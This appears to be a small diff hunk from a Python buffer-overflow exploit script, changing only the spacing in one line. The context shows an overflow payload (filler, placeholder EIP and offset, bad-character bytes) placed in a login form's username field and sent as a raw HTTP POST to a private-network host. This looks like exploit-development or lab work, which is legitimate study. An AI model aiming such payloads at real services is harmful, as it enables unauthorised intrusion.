@@ -26,7 +26,7 @@ try:
 	eip = "B" * 4
 	offset = "C" * 4
 
-	inputBuffer = filler+ eip + offset + badchars
+	inputBuffer = filler + eip + offset + badchars
 	content= "username=" + inputBuffer + "&password=A"
 	buffer = "POST /login HTTP/1.1\r\n"
 	buffer+= "Host: 192.168.0.122:8080\r\n"
